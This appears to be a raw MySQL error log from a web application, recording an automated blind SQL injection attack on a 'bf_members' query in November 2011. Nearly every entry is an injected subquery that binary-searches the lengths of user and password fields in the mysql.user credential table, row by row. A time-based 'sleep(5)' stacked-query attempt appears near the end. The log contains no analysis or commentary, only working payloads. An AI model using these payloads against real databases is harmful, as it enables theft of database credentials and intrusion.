SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>60 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>46 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>39 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>35 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)=33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)<=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>144 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>88 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>60 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>46 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>39 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>35 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)=33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)<=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>144 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>88 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>60 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>46 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>39 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>35 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:38
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)=33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)<=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>144 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>88 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>60 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>46 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>39 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>35 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)>32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 3,1) t order by user desc)t limit 1)=33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)<=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>144 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>88 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>60 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>46 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>39 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:39
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>35 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)=33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)<=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>144 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>88 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>60 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>46 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>39 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>35 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)>32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:40
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 4,1) t order by user desc)t limit 1)=33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:28:34
SQL:
SELECT * FROM bf_members WHERE id=4 ;sleep(5);--
message:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'sleep(5);--' at line 1

2011-11-23 23:10:16
SQL:

message:
Can't connect to MySQL server on 'localhost' (10061)

